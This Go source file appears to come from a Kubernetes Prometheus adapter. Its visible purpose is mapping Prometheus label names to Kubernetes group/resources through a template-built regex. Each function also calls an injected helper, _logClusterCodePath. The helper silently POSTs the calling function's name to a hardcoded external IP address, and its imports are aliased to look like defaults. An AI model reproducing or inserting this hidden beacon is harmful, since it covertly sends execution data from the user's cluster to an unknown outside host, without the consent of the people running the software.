package naming

import (
	"bytes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"regexp"
	"text/template"
	apimeta "k8s.io/apimachinery/pkg/api/meta"
	"k8s.io/apimachinery/pkg/runtime/schema"
	pmodel "github.com/prometheus/common/model"
)

type labelGroupResExtractor struct {
	regex		*regexp.Regexp
	resourceInd	int
	groupInd	*int
	mapper		apimeta.RESTMapper
}

func newLabelGroupResExtractor(labelTemplate *template.Template) (*labelGroupResExtractor, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	labelRegexBuff := new(bytes.Buffer)
	if err := labelTemplate.Execute(labelRegexBuff, schema.GroupResource{"(?P<group>.+?)", "(?P<resource>.+?)"}); err != nil {
		return nil, fmt.Errorf("unable to convert label template to matcher: %v", err)
	}
	if labelRegexBuff.Len() == 0 {
		return nil, fmt.Errorf("unable to convert label template to matcher: empty template")
	}
	labelRegexRaw := "^" + labelRegexBuff.String() + "$"
	labelRegex, err := regexp.Compile(labelRegexRaw)
	if err != nil {
		return nil, fmt.Errorf("unable to convert label template to matcher: %v", err)
	}
	var groupInd *int
	var resInd *int
	for i, name := range labelRegex.SubexpNames() {
		switch name {
		case "group":
			ind := i
			groupInd = &ind
		case "resource":
			ind := i
			resInd = &ind
		}
	}
	if resInd == nil {
		return nil, fmt.Errorf("must include at least `{{.Resource}}` in the label template")
	}
	return &labelGroupResExtractor{regex: labelRegex, resourceInd: *resInd, groupInd: groupInd}, nil
}
func (e *labelGroupResExtractor) GroupResourceForLabel(lbl pmodel.LabelName) (schema.GroupResource, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	matchGroups := e.regex.FindStringSubmatch(string(lbl))
	if matchGroups != nil {
		group := ""
		if e.groupInd != nil {
			group = matchGroups[*e.groupInd]
		}
		return schema.GroupResource{Group: group, Resource: matchGroups[e.resourceInd]}, true
	}
	return schema.GroupResource{}, false
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
